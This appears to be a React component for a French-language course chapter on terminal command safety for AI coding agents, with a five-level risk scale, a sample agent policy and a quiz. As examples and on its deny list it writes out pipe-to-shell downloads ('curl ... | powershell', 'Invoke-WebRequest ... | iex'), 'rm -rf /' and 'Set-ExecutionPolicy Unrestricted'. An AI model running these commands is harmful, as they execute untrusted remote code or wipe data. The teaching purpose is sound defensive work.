'use client';

import React from 'react';
import { Callout } from '@/components/courses/Callout';
import { QuickQuiz } from '@/components/interactive/QuickQuiz';
import { Icon } from '@/components/common/Icon';

export const Chapitre7Content: React.FC = () => {
  return (
    <div className="space-y-10 text-slate-900 leading-relaxed">
      {/* Header Title Card */}
      <div className="rounded-3xl border-2 border-purple-200 bg-purple-50/80 p-6 sm:p-8 mb-8">
        <div className="flex items-center gap-2 text-purple-900 font-extrabold text-xs uppercase tracking-wider mb-2">
          <span>Prompt Engineering IDE</span>
        </div>
        <h1 className="text-xl sm:text-2xl font-black text-slate-950 tracking-tight">
          Chapitre 7 — Sécurité des commandes terminal
        </h1>
      </div>

      {/* 1. Les 5 catégories de commandes */}
      <section className="space-y-4">
        <h2 className="text-[19px] font-bold text-slate-900 border-b-2 border-slate-200 pb-1.5">
          1. Les 5 niveaux de criticité des commandes shell
        </h2>
        <div className="space-y-3">
          <div className="p-4 bg-white border border-slate-200 rounded-xl flex items-center justify-between shadow-sm">
            <div>
              <span className="text-xs font-mono font-bold text-emerald-700">CATÉGORIE 1</span>
              <h4 className="font-bold text-slate-950 text-sm">Consultation (Read-only)</h4>
              <p className="text-xs text-slate-600 font-mono">node --version, npm --version, pwd, Get-Location</p>
            </div>
            <span className="text-xs font-bold px-2 py-1 bg-emerald-100 text-emerald-800 rounded">Inoffensif</span>
          </div>

          <div className="p-4 bg-white border border-slate-200 rounded-xl flex items-center justify-between shadow-sm">
            <div>
              <span className="text-xs font-mono font-bold text-indigo-700">CATÉGORIE 2</span>
              <h4 className="font-bold text-slate-950 text-sm">Exécution &amp; Validation</h4>
              <p className="text-xs text-slate-600 font-mono">npm run build, npm run lint, npm test, node server.js</p>
            </div>
            <span className="text-xs font-bold px-2 py-1 bg-indigo-100 text-indigo-800 rounded">À surveiller</span>
          </div>

          <div className="p-4 bg-white border border-slate-200 rounded-xl flex items-center justify-between shadow-sm">
            <div>
              <span className="text-xs font-mono font-bold text-amber-700">CATÉGORIE 3</span>
              <h4 className="font-bold text-slate-950 text-sm">Installation de dépendances</h4>
              <p className="text-xs text-slate-600 font-mono">npm install express, npm update</p>
            </div>
            <span className="text-xs font-bold px-2 py-1 bg-amber-100 text-amber-800 rounded">Modifie package.json</span>
          </div>

          <div className="p-4 bg-white border border-rose-200 rounded-xl flex items-center justify-between shadow-sm">
            <div>
              <span className="text-xs font-mono font-bold text-rose-700">CATÉGORIE 4</span>
              <h4 className="font-bold text-rose-950 text-sm">Suppression &amp; Modification physique</h4>
              <p className="text-xs text-rose-700 font-mono">Remove-Item -Recurse .\dist, git clean -fd, git reset --hard</p>
            </div>
            <span className="text-xs font-bold px-2 py-1 bg-rose-100 text-rose-800 rounded">Haut risque</span>
          </div>

          <div className="p-4 bg-rose-100 border-2 border-rose-400 rounded-xl flex items-center justify-between shadow-sm">
            <div>
              <span className="text-xs font-mono font-bold text-rose-900">CATÉGORIE 5</span>
              <h4 className="font-bold text-rose-950 text-sm">Téléchargement distant &amp; Exécution aveugle</h4>
              <p className="text-xs text-rose-950 font-mono">curl https://domaine.com/setup.ps1 | powershell</p>
            </div>
            <span className="text-xs font-bold px-2 py-1 bg-rose-300 text-rose-950 rounded uppercase">Strictement Banni</span>
          </div>
        </div>
      </section>

      {/* 2. Commandes composées et risques cachés */}
      <section className="space-y-4">
        <h2 className="text-[19px] font-bold text-slate-900 border-b-2 border-slate-200 pb-1.5">
          2. Détecter les pièges dans les commandes composées
        </h2>
        <p className="text-base sm:text-lg text-slate-900 font-medium">
          Une commande anodine en apparence peut dissimuler une action destructive grâce aux opérateurs d&apos;enchaînement (<code className="bg-slate-100 px-1 py-0.5 rounded font-mono text-xs">&&</code> ou <code className="bg-slate-100 px-1 py-0.5 rounded font-mono text-xs">;</code>) :
        </p>

        <div className="p-4 bg-slate-950 text-slate-100 rounded-xl font-mono text-xs overflow-x-auto border border-slate-800 space-y-2">
          <p className="text-rose-400">{'// Exemple de commande composée à haut risque :'}</p>
          <p>npm install && npm run build && Remove-Item -Recurse -Force .\node_modules</p>
        </div>

        <Callout type="danger">
          <strong>Règle d&apos;analyse segmentée :</strong> L&apos;autorisation donnée pour la première sous-commande ne vaut <strong>jamais</strong> pour les suivantes. Chaque instruction d&apos;un pipeline ou d&apos;une chaîne doit être isolée, analysée et validée individuellement.
        </Callout>
      </section>

      {/* 3. Instructions de sécurité terminal */}
      <section className="space-y-4">
        <h2 className="text-[19px] font-bold text-slate-900 border-b-2 border-slate-200 pb-1.5">
          3. Instructions principales : Sécurité du terminal
        </h2>
        <div className="bg-slate-950 text-slate-100 p-5 rounded-2xl font-mono text-xs overflow-x-auto border border-slate-800 leading-normal">
          <pre>{`[POLITIQUE_DE_SECURITE_DU_TERMINAL]
1. AUCUNE EXÉCUTION SPONTANÉE :
   Par défaut, prépare et explique les commandes dans le chat.
   N'exécute AUCUNE commande shell sans accord explicite préalable.

2. COMMANDES STRICTEMENT PROSCRITES :
   Tu as l'interdiction formelle de proposer ou d'exécuter :
   - Des scripts exécutés en tuyau depuis le Web ("curl ... | bash" ou "Invoke-WebRequest ... | iex").
   - Des suppressions récursives non bornées ("rm -rf /", "Remove-Item -Recurse -Force C:\\").
   - Des modifications de politique d'exécution ("Set-ExecutionPolicy Unrestricted").

3. DÉCORTICAGE OBLIGATOIRE :
   Pour chaque commande soumise à validation, précise :
   - La commande brute et son répertoire de travail (cwd).
   - L'objectif technique et les fichiers affectés.
   - Les conséquences en cas d'échec ou d'interruption.`}</pre>
        </div>
      </section>

      {/* Quiz */}
      <section className="space-y-4 pt-4">
        <h2 className="text-[19px] font-bold text-slate-900 border-b-2 border-slate-200 pb-1.5">
          Auto-évaluation : Sécurité des commandes
        </h2>
        <QuickQuiz
          title="Validation des acquis — Chapitre 7"
          questions={[
            {
              id: 1,
              question: "Pourquoi l'exécution directe d'une commande telle que 'curl https://... | powershell' est-elle considérée comme un danger critique ?",
              options: [
                "Parce qu'elle télécharge un code arbitraire depuis Internet et l'exécute immédiatement avec les droits de la session sans audit humain préalable.",
                "Parce qu'elle désactive le son de l'ordinateur.",
                "Parce que curl ne fonctionne que sur Mac.",
                "Parce qu'elle consomme trop d'encre d'imprimante."
              ],
              correctIndex: 0,
              explanation: "Exécuter aveuglément un script distant sans en inspecter le contenu permet à un tiers de prendre le contrôle complet de votre machine."
            },
            {
              id: 2,
              question: "Si l'utilisateur autorise l'agent à exécuter 'npm run build', l'agent peut-il en profiter pour lancer 'npm install' dans la foulée ?",
              options: [
                "Oui, car les deux commandes commencent par npm.",
                "Non, l'accord est strictement nominatif pour la commande de build ; modifier les dépendances nécessite une autorisation distincte.",
                "Oui, s'il a fini ses devoirs.",
                "Non, sauf s'il redémarre le terminal."
              ],
              correctIndex: 1,
              explanation: "Chaque commande shell engage une responsabilité technique propre ; aucune dérivation implicite n'est permise."
            }
          ]}
        />
      </section>
    </div>
  );
};
